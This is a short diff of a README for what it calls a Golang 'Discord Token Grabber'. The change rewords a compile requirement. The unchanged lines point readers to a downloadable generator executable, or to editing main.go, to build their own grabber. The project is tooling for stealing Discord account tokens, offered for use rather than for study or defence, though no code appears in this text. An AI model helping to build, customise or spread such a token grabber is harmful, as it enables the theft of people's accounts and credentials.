@@ -6,7 +6,7 @@ Discord Token Grabber made with Golang
 ## Requirements
 You need to have [Go](https://golang.org/doc/install) installed in your computer and probably a [GCC compiler](https://osdn.net/projects/mingw/releases/)
 
-If need must have at least Go installed in order to edit ``main.go`` with the information needed 
+If you want to compile yourself, you must have at least Go installed in order to edit ``main.go`` with the information needed 
 
 ## Warning
 Use the [generator](https://github.com/pedrokpp/discord-token-grabber/releases/download/2.0/tg-gen.exe) or edit ``main.go`` in order to personalize your own token grabber
